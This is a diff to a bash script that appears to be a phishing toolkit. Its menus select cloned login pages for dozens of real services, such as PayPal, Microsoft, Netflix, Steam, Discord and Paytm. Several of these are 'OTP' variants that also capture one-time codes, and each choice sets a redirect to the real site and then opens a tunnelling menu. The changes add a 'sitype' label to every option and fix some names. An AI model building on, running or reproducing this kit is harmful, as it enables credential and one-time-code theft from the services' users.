@@ -1999,9 +2084,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="mediafire"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="mediafire/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2026,15 +2113,19 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="messenger"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="messenger/otp"
+                sitype="OTP"
                 tunnelmenu;;
         3 | 03)
                 website="messenger_old"
+                sitype="Old"
                 tunnelmenu;;
         4 | 04)
                 website="messenger_old/otp"
+                sitype="Old/OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2057,9 +2148,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="microsoft"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="microsoft/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2071,6 +2164,7 @@ site_mobiwik(){
 website="mobiwik"
 rdurl="www.mobikwik.com/"
 siname="Mobiwik"
+sitype="Default"
 tunnelmenu
 }
 #myspace
@@ -2089,9 +2183,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="myspace"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="myspace/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2114,9 +2210,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="netflix"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="netflix/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2128,13 +2226,15 @@ site_ola(){
 website="ola"
 rdurl="www.olacabs.com/"
 siname="OLA"
+sitype="Default"
 tunnelmenu
 }
 #origin
 site_origin(){
 website="origin"
-rdurl="origin.onl/"
+rdurl="origin.onl"
 siname="origin"
+sitype="Default"
 tunnelmenu
 }
 #paypal
@@ -2153,9 +2253,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="paypal"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="paypal/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2180,15 +2282,19 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="paytm"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="paytm/otp"
+                sitype="OTP"
                 tunnelmenu;;
         3 | 03)
                 website="paytmoffer"
+                sitype="Offer"
                 tunnelmenu;;
         4 | 04)
                 website="paytmoffer/otp"
+                sitype="Offer/OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2200,6 +2306,7 @@ site_phonepe(){
 website="phonepe"
 rdurl="www.phonepe.com/"
 siname="phonepe"
+sitype="Default"
 tunnelmenu
 }
 #origin
@@ -2207,6 +2314,7 @@ site_pinterest(){
 website="pinterest"
 rdurl="pinterest.com/"
 siname="Pinterest"
+sitype="Default"
 tunnelmenu
 }
 #playstation
@@ -2226,12 +2334,15 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="playstation"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="playstation/otp"
+                sitype="OTP"
                 tunnelmenu;;
         3 | 03)
                 website="playstation2"
+                sitype="2"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2250,9 +2361,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="protonmail"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="protonmail/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2264,6 +2377,7 @@ site_pubg(){
 website="pubg"
 rdurl="www.pubgmobile.com/"
 siname="PUBG"
+sitype="Old"
 tunnelmenu
 }
 #quora
@@ -2271,6 +2385,7 @@ site_quora(){
 website="quora"
 rdurl="www.quora.com/"
 siname="Quora"
+sitype="Default"
 tunnelmenu
 }
 #reddit
@@ -2289,9 +2404,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="reddit"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="reddit_old"
+                sitype="Old"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2314,9 +2431,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="shopify"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="shopify/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2339,9 +2458,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="snapchat"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="snapchat/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2364,9 +2485,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="socialclub"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="socialclub/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2389,9 +2512,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="spotify"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="spotify/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2414,9 +2539,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="stackoverflow"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="stackoverflow/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2439,9 +2566,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="steam"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="steam/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2453,6 +2582,7 @@ site_subitoit(){
 website="subitoit"
 rdurl="www.subito.it/"
 siname="Subitoit"
+sitype="Default"
 tunnelmenu
 }
 #telegram
@@ -2460,13 +2590,15 @@ site_telegram(){
 website="telegram"
 rdurl="telegram.org/"
 siname="Telegram"
+sitype="Default"
 tunnelmenu
 }
 #telenor
 site_telenor(){
 website="telenor"
 rdurl="www.telenor.com/"
-siname="Trgin"
+siname="Telenor"
+sitype="Default"
 tunnelmenu
 }
 #tiktok
@@ -2486,12 +2618,15 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="tiktok"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="tiktok_likes"
+                sitype="Likes"
                 tunnelmenu;;
         3 | 03)
                 website="tiktok_likes/otp"
+                sitype="Likes/OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2511,12 +2646,15 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="twitch"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="twitch/otp"
+                sitype="OTP"
                 tunnelmenu;;
         3 | 03)
                 website="twitch_new"
+                sitype="New"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2539,9 +2677,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="twitter"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="twitter/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2564,9 +2704,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="ubereats"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="ubereats/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2589,9 +2731,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="verizon"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="verizon/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2603,6 +2747,7 @@ site_visim(){
 website="visim"
 rdurl="www.myvi.in/"
 siname="VI sim"
+sitype="Default"
 tunnelmenu
 }
 #vk
@@ -2622,12 +2767,15 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="vk"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="vk/otp"
+                sitype="OTP"
                 tunnelmenu;;
         3 | 03)
                 website="vk_poll"
+                sitype="Poll"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2639,6 +2787,7 @@ site_whatsapp(){
 website="whatsapp"
 rdurl="www.web.whatsapp.com"
 siname="WhatsApp"
+sitype="Default"
 tunnelmenu
 }
 #wordpress
@@ -2657,9 +2806,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="wordpress"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="wordpress/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2682,9 +2833,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="xbox"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="xbox/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2707,9 +2860,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="yahoo"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="yahoo/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2732,9 +2887,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="yandex"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="yandex/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2757,9 +2914,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="ytsubs"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="ytsubs/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2783,9 +2942,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="discord"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="discord/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2804,9 +2965,11 @@ read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 case $sichoice in
         1 | 01)
                 website="jiorouter"
+                sitype="Default"
                 tunnelmenu;;
         2 | 02)
                 website="jiorouter/otp"
+                sitype="OTP"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -2818,6 +2981,7 @@ site_googlewifi(){
 website="googlewifi"
 rdurl="fiber.google.com/wifi/"
 siname="Google WIFI"
+sitype="Default"
 tunnelmenu
 }
 #pattern
@@ -2825,6 +2989,7 @@ site_pattern(){
 website="pattern"
 rdurl=""
 siname="Pattern"
+sitype="Default"
 tunnelmenu
 }
 
